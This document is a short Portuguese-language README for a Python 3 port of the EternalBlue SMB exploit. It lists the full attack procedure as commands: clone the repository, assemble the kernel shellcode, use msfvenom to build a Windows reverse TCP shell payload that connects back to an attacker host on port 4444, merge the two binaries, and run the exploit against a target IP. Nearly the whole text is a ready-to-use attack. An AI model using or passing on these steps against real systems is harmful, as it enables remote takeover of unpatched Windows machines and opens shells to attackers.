# EternalBlue com Python3

##

### 1. Clonando o repositorio:

```
git clone https://github.com/hasecto/eternalblue_python3.git
```

## 2. Compilando o shellcode:

### x64

```
nasm -f bin shellcode/eternalblue_x64.asm -o ./sc_x64_kernel.bin
```

### x86

```
nasm -f bin shellcode/eternalblue_x86.asm -o ./sc_x86_kernel.bin
```

## 3. Criando o payload:

### x64

```
msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=IP --platform windows -a x64 --format raw -o sc_x64_payload.bin
```

### x86

```
msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=IP --platform windows -a x86 --format raw -o sc_x86_payload.bin
```

### Fazendo o Merge dos arquivos:

###x64
```
cat sc_x64_kernel.bin sc_x64_payload.bin > shell.bin
```
###x86
```
cat sc_x86_kernel.bin sc_x86_payload.bin > shell.bin
```

## 4. Exploit:

```
python3 eternalblue.py Alvo-IP shell.bin
```


